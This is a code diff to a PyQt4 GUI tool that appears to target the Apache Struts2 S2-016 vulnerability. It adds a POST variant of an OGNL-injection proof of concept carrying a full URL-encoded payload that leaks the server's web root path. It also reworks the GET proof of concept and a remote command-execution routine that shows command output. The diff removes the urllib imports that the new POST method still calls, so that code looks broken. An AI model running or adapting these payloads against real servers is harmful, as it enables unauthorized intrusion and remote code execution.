@@ -2,9 +2,6 @@
 import sys
 from PyQt4 import QtCore, QtGui, QtWebKit
 from s2016 import Ui_MainWindow
-import urllib.request
-import urllib.parse
-import urllib
 import requests
 
 class StartQt4(QtGui.QMainWindow):
@@ -17,17 +14,22 @@ class StartQt4(QtGui.QMainWindow):
         QtCore.QObject.connect(self.ui.comboBox, QtCore.SIGNAL("currentIndexChanged(int)"), self.mode)
         QtCore.QObject.connect(self.ui.pushButton_2, QtCore.SIGNAL("clicked()"), self.file_dialog)
 
+    def PoC_POST(self):
+        #此为PoC的POST方法
+        payload = "redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"
+        try:
+            res = urllib.request.Request(self.address, payload.encode("utf-8"))
+            data = urllib.request.urlopen(res).read().decode("utf-8")
+            self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
+        except Exception as e:
+            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
+
     def PoC(self):
         payload = "?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"
         target_url = (self.address + payload)
-        #print(target_url)
         try:
-            req = urllib.request.Request(target_url, method = "GET")
-            response = urllib.request.urlopen(req) 
-            if response:
-                data = response.read()
-                data = str(data, encoding = "utf-8")
-                self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
+            data = requests.get(target_url).content.decode("utf-8")
+            self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
         except Exception as e:
             self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
         
@@ -38,10 +40,8 @@ class StartQt4(QtGui.QMainWindow):
         target_url = (self.address + payload)
         #print(target_url)
         try:
-            req = requests.get(target_url)
-            data = req.content
+            data = requests.get(target_url).content.decode("utf-8")
             #print(data)
-            data = str(data, encoding = "utf-8")
             self.ui.textBrowser.setText("%s命令执行结果：\n%s" %(self.command, data.rstrip())) #将结果输出至textBrowser
         except Exception as e:
             self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
